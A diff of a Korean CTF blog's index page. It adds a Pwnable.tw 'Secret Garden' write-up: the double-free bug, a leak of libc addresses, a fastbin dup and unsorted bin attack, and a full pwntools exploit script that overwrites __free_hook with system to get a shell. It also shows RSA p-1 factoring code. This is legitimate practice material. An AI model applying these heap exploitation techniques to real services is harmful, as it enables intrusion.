@@ -67,6 +67,58 @@
     <header class="title">
       
         <h1>
+          <a href="/2018/01/20/Pwnable-tw-Secret-Garden/">Pwnable.tw - Secret Garden</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2018-01-20T12:21:37.000Z" itemprop="datePublished">
+    2018-01-20
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/pwnable/">Pwnable</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// remove_flower function</span></span><br><span class="line"> __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">99</span> &amp;&amp; (v5 = flower_list[v7]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      *v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(flower_list[v7] + <span class="number">8L</span>L));           <span class="comment">// double free</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>취약점은 remove_flower에서 발생한다. flower가 이미 free 되었는지 검사를 하지 않기 때문에 여러번 free 시킬 수 있다.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// raise_flower function</span></span><br><span class="line"> __printf_chk(<span class="number">1L</span>L, <span class="string">"The name of flower :"</span>, v3, v4);</span><br><span class="line"> read(<span class="number">0</span>, name, *size);</span><br></pre></td></tr></table></figure>
+<p>flower의 이름을 read로 입력받고 null 바이트를 끝에 불여주지 않는다. 이를 통해서 unsorted bin의 주소를 leak하여 libc 주소를 알아낼 수 있다.</p>
+<p>fastbin dup 공격을 통해 malloc_hook 를 oneshot 주소로 바꿀려고 했지만, oneshot 조건에 걸려서 free_hook를 system 주소로 바꾸고 system(‘/bin/sh’)을 실행시키기로 하였다. 그런데 문제를 풀고 나서 확인해보니 malloc_hook를 oneshot 주소로 바꾸는 방법이 가능했다… </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//malloc.c - 3582</span></span><br><span class="line">  <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br></pre></td></tr></table></figure>
+<p>fastbin dup 공격이 성공하기 위해서는 fastbin index 검사를 우회하여야 한다. 변조한 fd인 victim의 사이즈가 fastbin chunk size 이여야하는데 free_hook 주변에는 모두 null이여서 바로 fastbin dup 공격을 하지 못하고 unsortbin bin attack을 통해 free_hook 조금뒤에 unsorted bin의 주소를 넣고 0x7f를 fastbin chunk 사이즈로 사용해 검사를 우회하였다.(__free_hook 뒤에 공간이 printf, scanf 함수가 실행되고 나면 모두 null로 초기화되서 free_hook - 0x1D를 fake chunk로 사용해야함) unsortbin bin attack 역시 fastbin dup를 통해 bk를 변조하였다.</p>
+<h3 id="Exploit-py"><a href="#Exploit-py" class="headerlink" title="Exploit.py"></a>Exploit.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10203</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/libc_64.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raise_flower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(length))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> length&gt;<span class="number">0</span>:</span><br><span class="line">		s.send(name)</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_garden</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_flower</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean_garden</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Leak</span></span><br><span class="line">raise_flower(<span class="number">0x200</span>,<span class="string">'a'</span>*<span class="number">0x200</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">0x200</span>,<span class="string">'a'</span>*<span class="number">0x200</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">40</span>,<span class="string">'a'</span>*<span class="number">40</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">10</span>,<span class="string">'1'</span>*<span class="number">10</span>,<span class="string">'red'</span>)</span><br><span class="line">remove_flower(<span class="number">0</span>)</span><br><span class="line">remove_flower(<span class="number">1</span>)</span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(<span class="number">0</span>,<span class="string">''</span>,<span class="string">'red'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Name of the flower[4] :'</span>)</span><br><span class="line">libc_leak = u64(s.recvn(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3C3D78</span></span><br><span class="line">libc_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">4</span>)</span><br><span class="line">raise_flower(<span class="number">8</span>,<span class="string">'1'</span>*<span class="number">8</span>,<span class="string">'red'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Name of the flower[5] :'</span>+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">heap_leak = u64(s.recvn(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">heap_base = heap_leak - <span class="number">0x1280</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base  : "</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_hook  : "</span>+hex(libc_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base  : "</span>+hex(heap_base)</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">3</span>)</span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">clean_garden()</span><br><span class="line"></span><br><span class="line"><span class="comment">### Unsorted bin attack using fastbin dup</span></span><br><span class="line">SIZE = <span class="number">0x60</span></span><br><span class="line">raise_flower(<span class="number">0x10</span>,p64(<span class="number">0x7f</span>)*<span class="number">2</span>,<span class="string">'red'</span>) </span><br><span class="line">raise_flower(<span class="number">0x150</span>,<span class="string">'b'</span>*<span class="number">0x150</span>,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,<span class="string">'a'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">40</span>,<span class="string">'c'</span>*<span class="number">40</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line">remove_flower(<span class="number">3</span>)</span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = heap_base + <span class="number">0x1050</span></span><br><span class="line">raise_flower(SIZE,p64(fake_chunk),<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'c'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">4</span>)</span><br><span class="line">remove_flower(<span class="number">1</span>)</span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x1050</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x161</span>) + p64(libc_hook - <span class="number">0x10</span> <span class="number">-13</span>)*<span class="number">2</span></span><br><span class="line">raise_flower(SIZE,payload,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">0x150</span>,<span class="string">'a'</span>*<span class="number">0x150</span>,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Fastbin dup in free_hook</span></span><br><span class="line">fake_chunk = libc_hook - <span class="number">0x10</span></span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">remove_flower(<span class="number">6</span>)</span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">clean_garden()</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,p64(fake_chunk),<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'/bin/sh;'</span>.ljust(SIZE,<span class="string">'a'</span>),<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,p64(libc_system),<span class="string">'red'</span>)</span><br><span class="line">remove_flower(<span class="number">0</span>)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h3><ul>
+<li><p>fastbin dup 공격과 unsorted bin attack을 이용하는 방법말고, fastbin dup 공격으로 main_arena-&gt;top_chunk를 free_hook-0xb58 정도로 바꿔주면 malloc을 계속 호출하다 보면 free_hook를 overwrite 할 수 있다.</p>
+</li>
+<li><p>uaf를 통해 flower 구조체를 조작하여 libc.symbols[‘environment’]로 스택 주소를 알아낸 뒤, fastbin dup로 rop하는 방법</p>
+</li>
+<li><p>stdout이나 heap에 저장된 file pointer의 vtable을 조작하여 oneshot 실행</p>
+</li>
+</ul>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
           <a href="/2018/01/15/WhiteHacker-League-2017-Zertual/">WhiteHacker League 2017 - Zertual</a>
         </h1>
       
@@ -441,44 +493,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># python sovle.py </span></span><br><span class="line">p : 0xe171c91c9e775f06802d83cbf21643a137b576a582e1fee5bbe1566ba5c532400717dfaa2122229c440000000000000000000000000000000000000000000001L</span><br></pre></td></tr></table></figure>
 <p>와이어 샤크에서 ssl key 등록하는 방법은 아래 블로그를 참고하여 index.html을 복호화하였다.<br><a href="https://secuof.wordpress.com/2014/12/12/wireshark%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-ssl-%ED%8C%A8%ED%82%B7-%EB%B6%84%EC%84%9D/" target="_blank" rel="noopener">WireShark를 이용한 SSL 패킷 분석</a><br><br><br></p>
 <h3 id="Solve-py"><a href="#Solve-py" class="headerlink" title="Solve.py"></a>Solve.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exkey = <span class="string">"""-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy</span></span><br><span class="line"><span class="string">8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj</span></span><br><span class="line"><span class="string">DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl</span></span><br><span class="line"><span class="string">yioxCqbXYIMxGO4NcQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pubkey = RSA.importKey(exkey)</span><br><span class="line">n = pubkey.n</span><br><span class="line">e = pubkey.e</span><br><span class="line"></span><br><span class="line">a,B = <span class="number">2</span>,<span class="number">10000</span></span><br><span class="line">gcd_result,i = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd_result&lt;=<span class="number">1</span>:</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> i&gt;B:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	a = pow(a,i,n)</span><br><span class="line">	gcd_result = GCD(a<span class="number">-1</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"p : "</span>+hex(gcd_result)</span><br><span class="line">p = gcd_result</span><br><span class="line">q = n/p</span><br><span class="line">d = inverse(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">RSAobj = RSA.construct((n,e,d))</span><br><span class="line">privKey = RSAobj.exportKey(<span class="string">'PEM'</span>)</span><br><span class="line">f = open(<span class="string">'privKey.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(privKey)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-</article>
-
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2018/01/05/p-1-factorization/">p-1 factorization</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2018-01-04T18:44:46.000Z" itemprop="datePublished">
-    2018-01-05
-  </time>
-  
-  
-  / 
-  <ul>
-    
-  <li class="meta-text">
-  { <a href="/categories/crypto/">Crypto</a> }
-  </li>
-
-
-  </ul>
-  
-</div>
-
-    </header>
-    <div>
-      
-        <p>p-1 factorization 알고리즘은 N = pq (p,q 는 소수) 에서 N을 인수 분해하는 알고리즘이다.<br><br></p>
-<h3 id="Concept"><a href="#Concept" class="headerlink" title="Concept"></a>Concept</h3><p>페르마의 소정리에 의해 p가 소수이고 a가 p의 배수가 아니면, a<sup>p-1</sup> = 1 (mod p) 를 만족한다. 마찬가지로 a<sup>k(p-1)</sup> = 1 이므로 a<sup>k(p-1)</sup> - 1 은 p의 곱으로 표현할 수 있다. 그러면 k(p-1)의 값만 알 수 있다면 N을 분해할 수 있지만, k(p-1)을 알 수 없으므로 2!, 3!, 4! … n!(n &lt; B-smooth) 사용하고 gcd(a<sup>k(p-1)</sup> - 1,N) 을 계산하여 인수를 찾는다. 그래서 p-1 이 smooth number일 때 사용하기 적절하다.<br><br><br></p>
-<h3 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,B = <span class="number">2</span>,<span class="number">10000</span></span><br><span class="line">gcd_result,i = <span class="number">1</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd_result&lt;=<span class="number">1</span>:</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> i&gt;B:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	a = pow(a,i,n)</span><br><span class="line">	gcd_result = GCD(a<span class="number">-1</span>,n)</span><br></pre></td></tr></table></figure>
       
     </div>
 </article>
